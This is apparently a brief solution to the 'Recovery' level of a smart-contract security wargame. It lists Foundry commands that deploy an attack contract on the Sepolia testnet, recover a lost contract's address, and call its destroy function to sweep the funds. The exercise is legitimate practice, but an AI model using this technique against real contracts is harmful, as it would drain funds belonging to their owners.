# Recovery Solution

1) Deploy `RecoveryHack`:

```
forge create RecoveryHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```

2) Call `attack()` to retrieve the `lostContractAddress`:

```
cast call `recoveryHackAddress` "attack(address)" `ìnstanceAddress` --rpc-url $SEPOLIA_RPC_URL
# truncate the first 24 zeros from `lostContractAddress`
```

3) Call `destroy()`:

```
cast send `lostContractAddress` "destroy(address)" `sepoliaPublicKey` --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
